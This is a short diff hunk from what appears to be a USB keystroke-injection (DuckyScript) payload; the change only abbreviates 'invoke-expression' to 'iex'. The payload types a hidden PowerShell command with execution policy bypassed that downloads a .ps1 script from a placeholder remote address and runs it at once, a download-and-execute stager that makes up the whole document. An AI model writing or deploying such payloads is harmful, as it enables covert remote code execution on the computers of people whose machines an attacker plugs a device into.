@@ -12,6 +12,6 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr http://
 STRING REMOTE_IP_ADDRESS
-STRING /.ps1; invoke-expression $pl
+STRING /.ps1; iex $pl
 DELAY 500
 ENTER
